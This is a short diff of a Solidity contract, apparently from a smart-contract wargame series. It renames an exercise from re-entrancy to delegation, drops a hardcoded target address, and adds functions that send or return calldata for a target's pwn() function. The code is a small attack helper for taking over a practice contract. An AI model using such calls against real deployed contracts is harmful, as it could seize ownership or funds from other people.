@@ -2,14 +2,14 @@
 
 pragma solidity >=0.7.0 <0.9.0;
 
-contract E06_ReEntrancy {
-    address TARGET = 0xcAbFe0b80E9A230CFfe00F39c5aeEAeC9541f169;
+contract E06_Delegation {
+    constructor() payable {}
 
-    constructor() payable {
+    function pwn(address _target) external {
+        address(_target).call(abi.encodeWithSignature("pwn()"));
     }
 
-    function pwn() external {
-        address(TARGET).call(abi.encodeWithSignature("pwn()"));
+    function encode() public returns(bytes memory) {
+        return abi.encodeWithSignature("pwn()");
     }
 }
-
